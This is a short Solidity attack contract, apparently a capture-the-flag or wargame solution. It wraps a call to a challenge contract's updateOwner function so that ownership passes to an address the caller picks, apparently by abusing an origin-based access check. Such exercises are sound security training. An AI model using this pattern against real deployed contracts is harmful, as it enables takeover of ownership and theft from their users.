// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./UnknownOrigin.sol";

contract AttackerOrigin {
    UnknownOrigin public unknownOrig = UnknownOrigin(YOUR_CHALLENGE_CONTRACT_ADDRESS);

    function attackOwner(address _owner) public {
        unknownOrig.updateOwner(_owner);
    }

}
